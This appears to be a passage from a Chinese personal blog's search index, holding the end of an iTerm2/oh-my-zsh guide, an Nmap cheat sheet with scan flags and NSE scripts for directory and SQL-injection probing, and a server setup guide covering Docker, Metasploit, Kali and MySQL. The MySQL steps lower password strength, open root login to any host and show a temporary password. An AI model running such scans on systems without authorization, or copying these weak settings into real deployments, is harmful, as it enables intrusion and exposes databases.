~/.zshrc</code>文件，找到plugins配置，增加<code>zsh-autosuggestions</code>插件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vim ~&#x2F;.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2020/03/10/iterm2-pei-zhi/img-2.png" class="slug"><h3 id="1-6-iTerm2-快速隐藏和显示窗体"><a href="#1-6-iTerm2-快速隐藏和显示窗体" class="headerlink" title="1.6 iTerm2 快速隐藏和显示窗体"></a>1.6 iTerm2 快速隐藏和显示窗体</h3><p>打开 iTerm2，按<code>Command + ,</code>键，打开 Preferences 配置界面，然后Profiles → Keys →Hotkey，自定义一个快捷键就可以了。</p><img src="/2020/03/10/iterm2-pei-zhi/img-3.png" class="slug"><h3 id="1-7-iTerm2-隐藏用户名和主机名"><a href="#1-7-iTerm2-隐藏用户名和主机名" class="headerlink" title="1.7 iTerm2 隐藏用户名和主机名"></a>1.7 iTerm2 隐藏用户名和主机名</h3><p>有时候我们的用户名和主机名太长，终端显示的时候会很不好看，我们可以手动去除。</p><p>编辑<code>vim ~/.zshrc</code>文件，增加<code>DEFAULT_USER=&quot;SKong&quot;</code>配置.</p><p>但是: 我的电脑没生效,至今未找到原因~~~<br><code>补充:已经找到原因,这个地方应该设置为: DEFAULT_USER=&quot;你电脑的用户名&quot;</code><br>比如:我的电脑用户名为pactepacterara,则DEFAULT_USER=”pactepacterara”<br>感谢网友<a href="https://blog.csdn.net/u/c57aa48a99b8">码渣</a>!</p><img src="/2020/03/10/iterm2-pei-zhi/img-4.png" class="slug"><h3 id="1-8-Iterm2-快捷指令"><a href="#1-8-Iterm2-快捷指令" class="headerlink" title="1.8 Iterm2 快捷指令"></a>1.8 Iterm2 快捷指令</h3><p>在iterm2中，选中某个路径或者某个词汇，iterm2就自动复制了,很方便。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">command + enter 进入与返回全屏模式command + t 新建标签command + w 关闭标签command + 数字 command + 左右方向键    切换标签command + enter 切换全屏command + f 查找command + d 水平分屏command + shift + d 垂直分屏command + option + 方向键 command + [ 或 command + ]    切换屏幕command + ; 查看历史命令command + shift + h 查看剪贴板历史ctrl + u    清除当前行ctrl + l    清屏ctrl + a    到行首ctrl + e    到行尾ctrl + f&#x2F;b  前进后退ctrl + p    上一条命令ctrl + r    搜索命令历史<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-9-卸载oh-my-zsh"><a href="#1-9-卸载oh-my-zsh" class="headerlink" title="1.9 卸载oh-my-zsh"></a>1.9 卸载oh-my-zsh</h3><p>进入到.oh-my-zsh/tools目录,依次执行</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$cd .oh-my-zsh&#x2F;toolschmod +x uninstall.sh.&#x2F;uninstall.shrm -rif .zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="关于-oh-my-zsh-提示检测到不安全的完成相关目录"><a href="#关于-oh-my-zsh-提示检测到不安全的完成相关目录" class="headerlink" title="关于[oh-my-zsh] 提示检测到不安全的完成相关目录"></a>关于[oh-my-zsh] 提示检测到不安全的完成相关目录</h2><ol><li>在.zshrc文件的第一行添加 <code>ZSH_DISABLE_COMPFIX=true</code></li></ol><p>参考链接：<a href="https://blog.csdn.net/qq_36955294/article/details/109340448?utm_term=iterm2%E9%85%8D%E7%BD%AE&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-109340448&amp;spm=3001.4430">https://blog.csdn.net/qq_36955294/article/details/109340448?utm_term=iterm2%E9%85%8D%E7%BD%AE&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-6-109340448&amp;spm=3001.4430</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap 命令速查</title>
      <link href="2020/02/28/nmap-ming-ling-su-cha/"/>
      <url>2020/02/28/nmap-ming-ling-su-cha/</url>
      
        <content type="html"><![CDATA[<h1 id="Nmap-命令详解"><a href="#Nmap-命令详解" class="headerlink" title="Nmap 命令详解"></a>Nmap 命令详解</h1><span id="more"></span><h2 id="1-端口扫描探测"><a href="#1-端口扫描探测" class="headerlink" title="1.端口扫描探测"></a>1.端口扫描探测</h2><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">-sT   #TCP connect() 扫描，这种方式会在目标主机中的日志中记录大量的链接请求和错误信息-sS   #半开扫描，很少有系统将其记录在系统日志，需要root权限-sF -sN  #密码FIN数据包扫描，Xmas Tree、Null扫描模式-sP  #ping 扫描，nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描-sU  #UDP扫描，但不可靠-sA  #这项高级的扫描方式通常用来穿过防火墙的规则集-sV  #探测端口服务版本-P0  #扫描之前不需要使用ping命令-v  #显示扫描过程-h  #帮助选项-p  #制定端口-O  #启用远程操作系统检测，启动脚本检测、扫描-A  #全面系统检测，启用脚本检测，扫描-oN&#x2F;-oX&#x2F;-oG #将报告写入文件，正常&#x2F;XML&#x2F;grepable 三种格式-T4 #针对TCP端口禁止动态扫描延迟超过十秒-iL #读取主机列表 例如 -iL C：\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-web扫描"><a href="#2-web扫描" class="headerlink" title="2.web扫描"></a>2.web扫描</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p 80 --script&#x3D;http-enum.nse www.xxx.com. #扫描敏感目录nmap -p 80 --script&#x3D;sql-injection.nse www.xxx.com # 扫描sql注入nmap --script all 127.0.0.1 #所有脚本扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器相关配置</title>
      <link href="2020/01/27/fu-wu-qi-xiang-guan-pei-zhi-zi-cha-biao/"/>
      <url>2020/01/27/fu-wu-qi-xiang-guan-pei-zhi-zi-cha-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><span id="more"></span><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><ol><li><h4 id="下载docker-ce的repo"><a href="#下载docker-ce的repo" class="headerlink" title="下载docker-ce的repo"></a>下载docker-ce的repo</h4></li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl https:&#x2F;&#x2F;[download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo](http:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo) -o &#x2F;etc&#x2F;yum.repos.d&#x2F;docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装依赖（这是相比centos7的关键步骤）</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install https:&#x2F;&#x2F;[download.docker.com&#x2F;linux&#x2F;fedora&#x2F;30&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.6-3.3.fc30.x86_64.rpm](http:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;fedora&#x2F;30&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.6-3.3.fc30.x86_64.rpm)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>安装docker-ce</li></ol><p><code>yum install docker-ce -y</code></p><ol start="4"><li>启动docker</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker-compose"></a>Docker-compose</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip3 install docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Screen-配置"><a href="#Screen-配置" class="headerlink" title="Screen 配置"></a>Screen 配置</h2><p>1.安装</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install screen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.相关参数</p><pre class="line-numbers language-none"><code class="language-none">screen -S yourname -&gt; 新建一个叫yourname的sessionscreen -ls         -&gt; 列出当前所有的sessionscreen -r yourname -&gt; 回到yourname这个sessionscreen -d yourname -&gt; 远程detach某个sessionscreen -d -r yourname -&gt; 结束当前session并回到yourname这个session<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置MSF"><a href="#配置MSF" class="headerlink" title="配置MSF"></a>配置MSF</h2><p>1.下载msf</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum install curl,wgetcurl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  .&#x2F;msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.非root 权限使用 MSF( 成功安装后请运行下属代码，以使下载的最新版本的msf连接数据库。)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">adduser msfsu msf.&#x2F;msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3.PS.在运行时请cd到msfconsole所在目录，应在”/opt/metasploit-framework/bin”</p><p>初次运行msf会创建数据库，但是msf默认使用的PostgreSQL数据库不能与root用户关联，这也这也就是需要新建用户msf来运行metasploit的原因所在。如果你一不小心手一抖，初次运行是在root用户下，请使用以下命令，然后使用非root用户初始化数据库。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfdb reinit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装Kali"><a href="#安装Kali" class="headerlink" title="安装Kali"></a>安装Kali</h2><p>1.启动docker</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker pull toolisticon&#x2F;kalilinux  docker run -t -i toolisticon&#x2F;kalilinux   &#x2F;bin&#x2F;bashapt-get update &amp;&amp; apt-get install metasploit-framework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="配置mysql"><a href="#配置mysql" class="headerlink" title="配置mysql"></a>配置mysql</h2><p>1.获取wget</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum -y install wget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.下载mysql安装包</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">wget https:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;mysql57-community-release-el7-8.noarch.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.安装MySQL</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rpm -ivh mysql57-community-release-el7-8.noarch.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.安装mysql服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cd &#x2F;etc&#x2F;yum.repos.d&#x2F;yum -y install mysql-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>5.启动mysql</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">systemctl start mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6.修改MySQL临时密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">grep &#39;temporary password&#39; &#x2F;var&#x2F;log&#x2F;mysqld.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7.登录mysql</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mysql -uroot -p #我的临时密码是：a22XRJ88&#x3D;+a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8.把MySQL的密码校验强度改为低风险</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set global validate_password_policy&#x3D;LOW;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9.修改MySQL的密码长度</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">set global validate_password_length&#x3D;5;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10.修改MySQL密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;xxx&#39;; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>11.若允许远程访问，首先要关闭Cenots的防火墙</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mysql -u root -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>12.切换到mysql数据</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">use mysql;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>13.修改为允许任何地址访问</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">update user set Host&#x3D;&#39;%&#39; where User&#x3D;&#39;root&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>14.刷新权限</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">flush privileges;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
